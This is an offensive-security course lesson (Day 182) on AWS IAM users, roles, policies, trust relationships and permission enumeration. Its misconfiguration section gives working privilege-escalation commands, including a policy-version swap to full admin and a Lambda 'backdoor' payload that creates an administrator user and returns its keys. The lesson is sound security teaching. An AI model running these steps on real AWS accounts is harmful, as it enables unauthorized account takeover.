---
title: "AWS IAM Fundamentals — Users, Roles, Policies, Trust Relationships, ARNs"
tags: [AWS, IAM, roles, policies, trust-relationships, ARNs, access-keys,
       assume-role, STS, least-privilege, ATT&CK-T1078.004, cloud-security]
module: 04-BroadSurface-02
day: 182
related_topics:
  - Cloud Threat Model (Day 181)
  - IAM Misconfiguration Attacks (Day 183)
  - SSRF to AWS Metadata Lab (Day 184)
  - Cloud Hardening (Day 195)
---

# Day 182 — AWS IAM Fundamentals

> "IAM is access control for everything in AWS. You cannot exploit cloud
> infrastructure without understanding IAM — because the credential you steal,
> the role you assume, and the policy you abuse are all IAM. Understand IAM
> before you touch anything else. This is the lock. You need to know how it
> works before you can pick it."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Explain the four IAM principal types: users, groups, roles, and service
   accounts, and know when each is used.
2. Read and interpret an IAM policy document — identify what it allows, what
   it denies, and on which resources.
3. Explain the IAM role assumption flow: trust policy, `sts:AssumeRole`, and
   temporary credentials.
4. Enumerate IAM permissions for a given set of credentials using the AWS CLI.
5. Identify the five most common IAM misconfigurations that lead to privilege
   escalation.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Cloud threat model | Day 181 |
| Linux command line | Days 9–10 |
| Authentication concepts | Days 39–41 |

**Tools to install:**

```bash
# AWS CLI v2
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install
aws --version

# Configure with test credentials (lab account or LocalStack)
aws configure
# AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
# AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Default region name: us-east-1
# Default output format: json
```

---

## Part 1 — IAM Principals

### 1.1 — IAM Users

A long-lived identity. Authenticates with a password (console) or access keys
(CLI/API). Should be used sparingly — roles are preferred for everything
automated.

**Access key format:**
```
Access Key ID:     AKIAIOSFODNN7EXAMPLE     (20 chars, starts with AKIA)
Secret Access Key: wJalrXUtnFEMI/...        (40 chars)
```

**Temporary session token format (from STS AssumeRole):**
```
Access Key ID:     ASIAIOSFODNN7EXAMPLE     (starts with ASIA — temporary!)
Secret Access Key: ...
Session Token:     AQoDYXdzEJr...           (long; required for all API calls)
```

### 1.2 — IAM Roles

A role is an identity without a password — it is assumed by another principal.
Roles are the correct way to grant permissions to:

- EC2 instances (instance profile)
- Lambda functions (execution role)
- ECS tasks (task role)
- Cross-account access
- Human users via SSO/federation

**Why roles beat users for services:** credentials are temporary (15 minutes
to 12 hours), automatically rotated by STS, and scoped to the role's policy.
There is no long-lived access key to leak.

### 1.3 — ARN Format

Every AWS resource has an Amazon Resource Name:

```
arn:aws:iam::123456789012:user/alice
arn:aws:iam::123456789012:role/ec2-web-role
arn:aws:iam::123456789012:policy/ReadOnlyS3
arn:aws:s3:::my-bucket
arn:aws:s3:::my-bucket/prefix/*
arn:aws:lambda:us-east-1:123456789012:function:process-uploads
arn:aws:ec2:us-east-1:123456789012:instance/i-0abcdef1234567890
```

Format: `arn:partition:service:region:account-id:resource-type/resource-id`

---

## Part 2 — IAM Policy Documents

A policy is a JSON document that specifies what actions are allowed or denied,
on which resources, under which conditions.

### 2.1 — Policy Structure

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowS3ReadOnSpecificBucket",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-app-uploads",
        "arn:aws:s3:::my-app-uploads/*"
      ]
    },
    {
      "Sid": "DenyDeleteEverywhere",
      "Effect": "Deny",
      "Action": "s3:DeleteObject",
      "Resource": "*"
    }
  ]
}
```

**Key fields:**

| Field | Values | Meaning |
|---|---|---|
| `Effect` | `Allow` / `Deny` | `Deny` always wins over `Allow` |
| `Action` | Service:operation or `*` | What API calls are permitted |
| `Resource` | ARN or `*` | Which resources the action applies to |
| `Condition` | Key-value map | Optional constraints (IP, MFA, time) |
| `Principal` | ARN, `*` | Who the statement applies to (in resource-based policies) |

### 2.2 — Policy Evaluation Logic

```
Default: DENY everything

For each request:
  1. Is there an explicit Deny anywhere? → DENY (final)
  2. Is there an explicit Allow? → ALLOW
  3. Otherwise → DENY (implicit)

Order of precedence:
  SCP (Org) > Permission Boundary > Identity Policy > Resource Policy > Session Policy
```

### 2.3 — Dangerous Policy Patterns

```json
// ⚠️ WILDCARD ACTION + RESOURCE — effectively superuser
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// ⚠️ IAM WRITE ACCESS — enables privilege escalation
{
  "Effect": "Allow",
  "Action": [
    "iam:CreateUser",
    "iam:AttachUserPolicy",
    "iam:CreateAccessKey"
  ],
  "Resource": "*"
}

// ⚠️ PASSROLE without restriction — allows privilege escalation via services
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "*"   // Should be restricted to specific roles
}
```

---

## Part 3 — Trust Relationships and Role Assumption

Every role has two policies:
1. **Trust policy** — who can assume this role (a principal in a different context)
2. **Permission policy** — what the role can do once assumed

### 3.1 — Trust Policy Examples

```json
// Allow EC2 instances to assume this role
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "ec2.amazonaws.com"},
    "Action": "sts:AssumeRole"
  }]
}

// Allow cross-account assumption (account 999999999999 assumes this role)
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::999999999999:root"},
    "Action": "sts:AssumeRole",
    "Condition": {
      "Bool": {"aws:MultiFactorAuthPresent": "true"}
    }
  }]
}

// ⚠️ DANGEROUS: any authenticated AWS principal can assume this role
{
  "Effect": "Allow",
  "Principal": {"AWS": "*"},
  "Action": "sts:AssumeRole"
}
```

### 3.2 — Assuming a Role

```bash
# Assume a role and get temporary credentials
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/ec2-web-role \
  --role-session-name attacker-session \
  --duration-seconds 3600

# Output:
# {
#   "Credentials": {
#     "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
#     "SecretAccessKey": "wJalrXUtnFEMI/...",
#     "SessionToken": "AQoDYXdzEJr...",
#     "Expiration": "2024-01-01T12:00:00Z"
#   }
# }

# Export as environment variables for subsequent calls
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/..."
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."

# Verify which identity you are now operating as
aws sts get-caller-identity
```

---

## Part 4 — IAM Enumeration with the AWS CLI

When you have a set of credentials, the first task is understanding what those
credentials can do. This is permission enumeration.

### 4.1 — Who Am I?

```bash
# Identity — always the first command
aws sts get-caller-identity
# {
#   "UserId": "AIDAIOSFODNN7EXAMPLE",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/alice"
# }
```

### 4.2 — Manual Permission Enumeration

```bash
# List policies attached to the current user
aws iam list-attached-user-policies --user-name alice
aws iam list-user-policies --user-name alice   # inline policies

# Get the actual policy document
POLICY_ARN="arn:aws:iam::aws:policy/ReadOnlyAccess"
VERSION=$(aws iam get-policy --policy-arn $POLICY_ARN \
  | jq -r '.Policy.DefaultVersionId')
aws iam get-policy-version --policy-arn $POLICY_ARN --version-id $VERSION \
  | jq '.PolicyVersion.Document'

# List all roles (if iam:ListRoles is permitted)
aws iam list-roles | jq '.Roles[].RoleName'

# Read a specific role's trust policy and permission policies
aws iam get-role --role-name ec2-web-role | jq '.Role.AssumeRolePolicyDocument'
aws iam list-attached-role-policies --role-name ec2-web-role
```

### 4.3 — Using Pacu or enumerate-iam for Automated Enumeration

```bash
# enumerate-iam: brute-force what a credential can do
pip install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key wJalr... --region us-east-1
# Outputs: every allowed API call across all AWS services

# Pacu (covered in detail on Day 186)
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip install -r requirements.txt
python3 pacu.py
```

---

## Part 5 — Common IAM Misconfigurations

### 5.1 — Privilege Escalation via `iam:CreatePolicyVersion`

A principal with `iam:CreatePolicyVersion` can create a new version of any
managed policy — including attaching `"Action": "*", "Resource": "*"` to their
own policy:

```bash
# Create a new admin version of the user's own policy
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/user-policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
  }' \
  --set-as-default
# Result: current policy now grants admin access
```

### 5.2 — Privilege Escalation via `iam:PassRole` + `lambda:CreateFunction`

```bash
# 1. Create a Lambda with a high-privilege execution role
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/high-priv-role \
  --handler index.handler \
  --zip-file fileb://payload.zip

# payload.py — creates an admin IAM user
import boto3
def handler(event, context):
    iam = boto3.client("iam")
    iam.create_user(UserName="backdoor-admin")
    iam.attach_user_policy(
        UserName="backdoor-admin",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
    )
    key = iam.create_access_key(UserName="backdoor-admin")
    return key["AccessKey"]

# 2. Invoke the function — Lambda runs as high-priv-role → admin user created
aws lambda invoke --function-name backdoor output.json
cat output.json
```

### 5.3 — Common Privilege Escalation Methods (Rhino Security Research)

| Dangerous Permission | Escalation Path |
|---|---|
| `iam:CreatePolicyVersion` | Create new policy version with admin access |
| `iam:SetDefaultPolicyVersion` | Switch to a previously created permissive version |
| `iam:AttachUserPolicy` | Attach `AdministratorAccess` to self |
| `iam:CreateAccessKey` | Create access key for another user (if policy allows target user) |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with high-priv instance profile → SSRF → creds |
| `iam:PassRole` + `lambda:CreateFunction` | Lambda with high-priv role → invoke → admin action |
| `iam:PassRole` + `glue:CreateJob` | Glue job with high-priv role → code execution |
| `sts:AssumeRole` (broad trust policy) | Assume roles not intended for the current principal |

---

## Key Takeaways

1. **IAM is the blast radius multiplier.** A low-privilege foothold combined
   with a single IAM misconfiguration becomes full account compromise. Always
   enumerate IAM before any other service.
2. **Roles > Users for everything automated.** Temporary credentials with
   automatic rotation are the correct model. Long-lived access keys are
   operational debt that becomes security debt under breach conditions.
3. **`iam:PassRole` is the most dangerous single IAM permission.** It allows
   granting a resource a role's permissions — which means an attacker with
   PassRole can effectively create admin-equivalent resources.
4. **Trust policies are the other half of role security.** A role with a
   `Principal: {"AWS": "*"}` trust policy is an unauthenticated admin door.
   Both the permission policy and the trust policy must be reviewed.
5. **Enumeration before exploitation.** Always run `get-caller-identity` and
   enumerate attached policies before attempting any escalation path. The
   credential you have may already have broader access than you expect.

---

## Exercises

1. Read this IAM policy and answer: (a) can the principal delete S3 objects?
   (b) can they list EC2 instances? (c) can they create IAM users?
   ```json
   {
     "Statement": [
       {"Effect": "Allow", "Action": "s3:*", "Resource": "*"},
       {"Effect": "Deny", "Action": "s3:Delete*", "Resource": "*"},
       {"Effect": "Allow", "Action": "ec2:Describe*", "Resource": "*"}
     ]
   }
   ```
2. Write a least-privilege IAM policy for a Lambda function that needs to:
   read from one specific S3 bucket (`arn:aws:s3:::uploads-prod/*`), write to
   DynamoDB table `sessions`, and write logs to CloudWatch. No other actions
   allowed. Use specific ARNs throughout.
3. Research: what is an IAM Permission Boundary? How does it interact with
   identity-based policies? Give an example of a scenario where a permission
   boundary prevents privilege escalation.
4. Using LocalStack (or a real AWS sandbox): create a role with the trust
   policy that allows your IAM user to assume it. Attach a policy allowing
   S3 read. Assume the role with the CLI. Verify with `get-caller-identity`.
   Then revoke your own assume-role permission and try again.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q182.1, Q182.2 …).
> Follow-up questions use hierarchical numbering (Q182.1.1, Q182.1.2 …).

---

## Navigation

← Previous: [Day 181 — Cloud Threat Model](DAY-0181-Cloud-Threat-Model.md)
→ Next: [Day 183 — IAM Misconfiguration Attacks](DAY-0183-IAM-Misconfiguration-Attacks.md)
